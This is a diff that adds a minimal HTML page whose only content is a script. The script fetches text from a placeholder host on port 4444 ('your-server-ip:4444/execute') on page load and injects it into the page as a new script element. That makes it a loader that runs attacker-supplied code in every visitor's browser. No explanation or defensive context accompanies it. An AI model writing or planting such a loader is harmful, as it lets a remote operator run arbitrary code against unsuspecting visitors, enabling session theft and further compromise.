@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch('http://your-server-ip:4444/execute')
+  .then(response => response.text())
+  .then(data => {
+    const script = document.createElement('script');
+    script.text = data;
+    document.body.appendChild(script);
+  });
+</script>
+</body>
+</html>
